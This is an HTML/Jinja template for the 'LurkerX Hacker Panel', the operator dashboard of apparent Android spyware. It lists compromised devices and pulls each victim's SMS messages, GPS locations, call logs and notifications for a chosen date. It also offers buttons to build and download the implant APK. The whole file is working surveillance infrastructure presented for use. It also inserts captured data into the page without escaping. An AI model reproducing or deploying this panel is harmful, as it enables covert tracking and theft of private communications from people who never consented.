<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>{% block title %}Hacker Panel | LurkerX{% endblock %}</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
  <style>
body {
  margin: 0;
  font-family: "Consolas", "Fira Code", "Segoe UI", monospace;
  background: #0f172a;
  color: #d1d5db;
  display: flex;
  height: 100vh;
}

.sidebar {
  min-width: 220px;
  background: #111827;
  color: #f9fafb;
  overflow-y: auto;
  padding: 20px;
  display: flex;
  flex-direction: column;
  border-right: 1px solid #1f2937;
}
.sidebar h2 {
  font-size: 1.2rem;
  margin-bottom: 15px;
  color: #10b981;
}
.device-item {
  padding: 8px 10px;
  color: #38bdf8;
  cursor: pointer;
  border-radius: 4px;
  transition: background 0.2s;
  margin-bottom: 4px;
}
.device-item:hover {
  background: rgba(56, 189, 248, 0.15);
}
.device-item.active {
  background: rgba(56, 189, 248, 0.25);
  color: #22d3ee;
}

.date-section {
  margin-top: 16px;
  padding-top: 12px;
  border-top: 1px solid #1f2937;
}
.date-section label {
  display: block;
  color: #9ca3af;
  font-size: 0.85rem;
  margin-bottom: 6px;
}
.date-section select {
  width: 100%;
  padding: 8px;
  border-radius: 6px;
  border: 1px solid #374151;
  background: #0f172a;
  color: #e5e7eb;
  font-family: monospace;
  margin-bottom: 8px;
}
.date-section button {
  width: 100%;
  padding: 8px;
  border: none;
  border-radius: 6px;
  background: #2563eb;
  color: #fff;
  cursor: pointer;
  font-weight: bold;
}
.date-section button:hover:not(:disabled) {
  background: #1e40af;
}
.date-section button:disabled {
  background: #374151;
  color: #9ca3af;
  cursor: not-allowed;
}

.main {
  flex: 1;
  padding: 20px;
  overflow-y: auto;
}
.main h1 {
  margin-top: 0;
  font-size: 1.5rem;
  color: #facc15;
}

.board-content {
  background: #1e293b;
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0 2px 6px rgba(0,0,0,0.6);
  margin-top: 15px;
  min-height: 60vh;
  overflow-y: auto;
  color: #e5e7eb;
  font-size: 0.95rem;
}

.filter-buttons {
  margin-top: 15px;
  display: flex;
  gap: 3px;
  flex-wrap: wrap;
}
.filter-buttons button {
  padding: 8px 14px;
  border: none;
  border-radius: 6px;
  background: #2563eb;
  color: #fff;
  cursor: pointer;
  font-size: 0.9rem;
  transition: background 0.2s;
}
.filter-buttons button:hover {
  background: #1e40af;
}
.wa-btn { background: #25d366 !important; color: #000; }
.wa-btn:hover { background: #128c7e !important; }
.x-btn { background: #1da1f2 !important; }
.x-btn:hover { background: #0d8ddb !important; }
.ig-btn { background: #e1306c !important; }
.ig-btn:hover { background: #a50e3c !important; }
.gm-btn { background: #d93025 !important; }
.gm-btn:hover { background: #a52714 !important; }

.spinner {
  border: 4px solid #1f2937;
  border-top: 4px solid #10b981;
}

.view-trigger {
  cursor: pointer;
  color: #22d3ee;
}
.view-trigger:hover {
  color: #06b6d4;
}

.apk-build {
  margin-top: 8px;
  padding: 10px;
  background: #1e40af;
  color: #fff;
  text-align: center;
  border-radius: 6px;
  font-weight: bold;
  cursor: pointer;
  border: none;
  width: 100%;
  font-size: 0.95rem;
}
.apk-build:hover:not(:disabled) {
  background: #2563eb;
}
.apk-build:disabled {
  background: #374151;
  color: #9ca3af;
  cursor: not-allowed;
}

.apk-download {
  margin-top: 8px;
  padding: 10px;
  background: #059669;
  color: #000;
  text-align: center;
  border-radius: 6px;
  font-weight: bold;
  cursor: pointer;
  text-decoration: none;
  display: block;
}
.apk-download:hover {
  background: #10b981;
}
  </style>
  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
</head>

<body>
  <div class="sidebar" id="sidebar">
    <h2>🤡 Hacker Panel</h2>
    <div id="device-list"></div>
    <div class="date-section" id="date-section" style="display:none;">
      <label for="date-select">Select date:</label>
      <select id="date-select">
        <option value="">-- choose date --</option>
      </select>
      <button id="apply-date-btn" disabled>Apply</button>
    </div>
    {% if not unauthorized %}
    <button id="build-apk-btn" class="apk-build">Build APK</button>
    <a id="download-apk-link" class="apk-download" href="/download_apk">Download APK</a>
    <p id="build-status" style="color: #9ca3af; font-size: 0.85rem; margin-top: 8px;"></p>
    {% endif %}
  </div>

  <div class="main">
    {% if unauthorized %}
    <div id="login-box" style="max-width: 400px; margin: 40px auto; padding: 24px; background: #1e293b; border-radius: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.6);">
      <h1 style="margin-top: 0; font-size: 1.5rem; color: #facc15;">🔐 LurkerX Panel</h1>
      <p style="color: #9ca3af;">Enter your token to access the panel.</p>
      <input id="token-input" type="text" placeholder="Encrypted token" style="width: 100%; padding: 10px; margin: 12px 0; border-radius: 6px; border: 1px solid #374151; background: #0f172a; color: #e5e7eb; font-family: monospace;" />
      <button id="login-btn" style="width: 100%; padding: 10px; border: none; border-radius: 6px; background: #10b981; color: #000; cursor: pointer; font-weight: bold;">Unlock Panel</button>
      <p id="login-error" style="color: #ef4444; margin-top: 10px; display: none;"></p>
    </div>
    {% else %}
    <div id="board-content" class="board-content">
      <p>Select a device from the sidebar to view its logs.</p>
    </div>
    {% endif %}
  </div>

  <div class="spinner-container">
    <div class="spinner" id="spinner"></div>
  </div>
  {% if unauthorized %}
  <script>
    document.getElementById("login-btn").addEventListener("click", function () {
      const token = document.getElementById("token-input").value.trim();
      const errorEl = document.getElementById("login-error");
      errorEl.style.display = "none";
      fetch("/validate_token", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token: token }),
      })
      .then((res) => {
        if (res.ok) {
          window.location.reload();
        } else {
          return res.json().then((data) => { throw new Error(data.error || "Invalid token"); });
        }
      })
      .catch((err) => {
        errorEl.textContent = err.message;
        errorEl.style.display = "block";
      });
    });
  </script>
  {% endif %}
  <script>
    const structure = {{ structure | tojson }};
    const deviceListEl = document.getElementById("device-list");
    const dateSection = document.getElementById("date-section");
    const dateSelect = document.getElementById("date-select");
    const applyDateBtn = document.getElementById("apply-date-btn");
    const boardContent = document.getElementById("board-content");

    let selectedDevice = null;

    function renderDevices() {
      deviceListEl.innerHTML = "";
      Object.keys(structure).forEach(device => {
        const div = document.createElement("div");
        div.className = "device-item";
        div.textContent = device;
        div.addEventListener("click", () => selectDevice(device, div));
        deviceListEl.appendChild(div);
      });
    }

    function selectDevice(device, el) {
      selectedDevice = device;
      document.querySelectorAll(".device-item").forEach(item => item.classList.remove("active"));
      el.classList.add("active");
      dateSection.style.display = "block";
      dateSelect.innerHTML = '<option value="">-- loading dates --</option>';
      applyDateBtn.disabled = true;
      fetch(`/api/devices/${encodeURIComponent(device)}/dates`)
        .then(res => res.json())
        .then(data => {
          dateSelect.innerHTML = '<option value="">-- choose date --</option>';
          if (data.dates && data.dates.length) {
            data.dates.forEach(date => {
              const option = document.createElement("option");
              option.value = date;
              option.textContent = date;
              dateSelect.appendChild(option);
            });
          } else {
            dateSelect.innerHTML = '<option value="">-- no dates --</option>';
          }
        })
        .catch(() => {
          dateSelect.innerHTML = '<option value="">-- error loading --</option>';
        });
    }

    applyDateBtn.addEventListener("click", () => {
      const date = dateSelect.value;
      if (!date || !selectedDevice) return;
      applyDateBtn.disabled = true;
      applyDateBtn.textContent = "Loading...";
      boardContent.innerHTML = "";
      const startTs = Math.floor(new Date(date + "T00:00:00Z").getTime() / 1000);
      const endTs = startTs + 86400;
      const types = ["sms", "gps", "calls", "notifs"];
      let loaded = 0;
      const results = {};
      function checkDone() {
        loaded++;
        if (loaded === types.length) {
          renderResults(results);
          applyDateBtn.disabled = false;
          applyDateBtn.textContent = "Apply";
        }
      }
      types.forEach(type => {
        fetch(`/get_info/${type}?min_timestamp=${startTs}&max_timestamp=${endTs}`, {
          headers: { "C-Device": selectedDevice }
        })
        .then(res => res.json())
        .then(data => {
          results[type] = data.data || [];
          checkDone();
        })
        .catch(() => {
          results[type] = [];
          checkDone();
        });
      });
    });

    dateSelect.addEventListener("change", () => {
      applyDateBtn.disabled = !dateSelect.value;
    });

    function renderResults(results) {
      boardContent.innerHTML = "";
      const sections = [
        { key: "sms", title: "SMS", icon: "📱" },
        { key: "gps", title: "GPS", icon: "📍" },
        { key: "calls", title: "Calls", icon: "📞" },
        { key: "notifs", title: "Notifications", icon: "🔔" }
      ];
      sections.forEach(sec => {
        const items = results[sec.key] || [];
        const header = document.createElement("h3");
        header.textContent = `${sec.icon} ${sec.title} (${items.length})`;
        boardContent.appendChild(header);
        if (!items.length) {
          const p = document.createElement("p");
          p.textContent = "No records found.";
          p.style.color = "#6b7280";
          boardContent.appendChild(p);
          return;
        }
        items.forEach(item => {
          const div = document.createElement("div");
          div.style.marginBottom = "12px";
          div.style.padding = "10px";
          div.style.background = "#1f2937";
          div.style.borderRadius = "8px";
          if (sec.key === "sms") {
            div.innerHTML = `<p><strong>Address:</strong> ${item.address || "Unknown"}</p><p><strong>Body:</strong> ${item.body}</p><p><strong>Date:</strong> ${new Date(item.date).toLocaleString()}</p>`;
          } else if (sec.key === "gps") {
            div.innerHTML = `<p><strong>Latitude:</strong> ${item.latitude}</p><p><strong>Longitude:</strong> ${item.longitude}</p><p><strong>Timestamp:</strong> ${new Date(item.timestamp).toLocaleString()}</p>`;
          } else if (sec.key === "calls") {
            div.innerHTML = `<p><strong>Number:</strong> ${item.number}</p><p><strong>Type:</strong> ${item.call_type}</p><p><strong>Duration:</strong> ${item.duration}s</p><p><strong>Timestamp:</strong> ${new Date(item.timestamp).toLocaleString()}</p>`;
          } else if (sec.key === "notifs") {
            div.innerHTML = `<p><strong>Package:</strong> ${item.package}</p><p><strong>Title:</strong> ${item.title || "(no title)"}</p><p><strong>Text:</strong> ${item.text || "(empty)"}</p><p><strong>Timestamp:</strong> ${new Date(item.timestamp).toLocaleString()}</p>`;
          }
          boardContent.appendChild(div);
        });
      });
    }

    renderDevices();
  </script>
  {% if not unauthorized %}
  <script>
    document.getElementById("build-apk-btn").addEventListener("click", function () {
      const btn = document.getElementById("build-apk-btn");
      btn.disabled = true;
      btn.textContent = "Starting build...";
      fetch("/build_apk", { method: "POST" })
        .then((res) => res.json())
        .then((data) => {
          if (data.status === "building") {
            btn.textContent = "Building...";
          } else {
            btn.disabled = false;
            btn.textContent = "Build APK";
          }
        })
        .catch(() => {
          btn.disabled = false;
          btn.textContent = "Build APK";
        });
    });
    setInterval(() => {
      fetch("/build_status")
        .then(res => res.json())
        .then(data => {
          const btn = document.getElementById("build-apk-btn");
          const link = document.getElementById("download-apk-link");
          const status = document.getElementById("build-status");
          if (data.status === "building") {
            btn.disabled = true;
            btn.textContent = "Building...";
            link.style.pointerEvents = "none";
            link.style.opacity = "0.5";
            status.textContent = "Building APK, please wait...";
            status.style.color = "#facc15";
          } else if (data.status === "error") {
            btn.disabled = false;
            btn.textContent = "Build APK";
            link.style.pointerEvents = "auto";
            link.style.opacity = "1";
            status.textContent = "Build failed: " + (data.error || "unknown error");
            status.style.color = "#ef4444";
          } else if (data.apk_exists) {
            btn.disabled = false;
            btn.textContent = "Build APK";
            link.style.pointerEvents = "auto";
            link.style.opacity = "1";
            status.textContent = "APK ready for download.";
            status.style.color = "#10b981";
          } else {
            btn.disabled = false;
            btn.textContent = "Build APK";
            link.style.pointerEvents = "none";
            link.style.opacity = "0.5";
            status.textContent = "APK not built yet.";
            status.style.color = "#9ca3af";
          }
        });
    }, 2000);
  </script>
  {% endif %}
</body>

</html>
